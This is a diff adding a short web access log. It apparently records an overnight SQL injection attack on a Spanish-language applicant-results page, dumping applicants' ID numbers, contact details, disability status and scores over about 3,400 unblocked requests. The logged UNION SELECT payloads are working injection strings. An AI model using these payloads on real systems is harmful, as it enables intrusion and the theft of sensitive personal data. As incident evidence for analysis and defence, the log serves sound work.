@@ -1,0 +1,7 @@
+2026-10-09 21:55:03 203.0.113.77 GET /resultados?dni=71234567 200 1.2KB
+2026-10-09 22:01:18 203.0.113.77 GET /resultados?dni=' UNION SELECT null,null,table_name FROM information_schema.tables-- 200 8.4KB
+2026-10-09 22:04:40 203.0.113.77 GET /resultados?dni=' UNION SELECT dni,nombres,correo FROM postulantes LIMIT 500 OFFSET 0-- 200 212KB
+2026-10-09 22:09:12 203.0.113.77 GET /resultados?dni=' UNION SELECT dni,nombres,correo FROM postulantes LIMIT 500 OFFSET 500-- 200 215KB
+2026-10-09 22:30:00 203.0.113.77 GET /resultados?dni=' UNION SELECT dni,celular,direccion,discapacidad FROM postulantes LIMIT 500 OFFSET 0-- 200 230KB
+2026-10-10 02:58:51 203.0.113.77 GET /resultados?dni=' UNION SELECT dni,puntaje,colegio FROM postulantes LIMIT 500 OFFSET 17500-- 200 224KB
+2026-10-10 03:00:12 203.0.113.77 (más de 3 400 peticiones similares entre 22:01 y 03:00; sin bloqueo ni alerta)
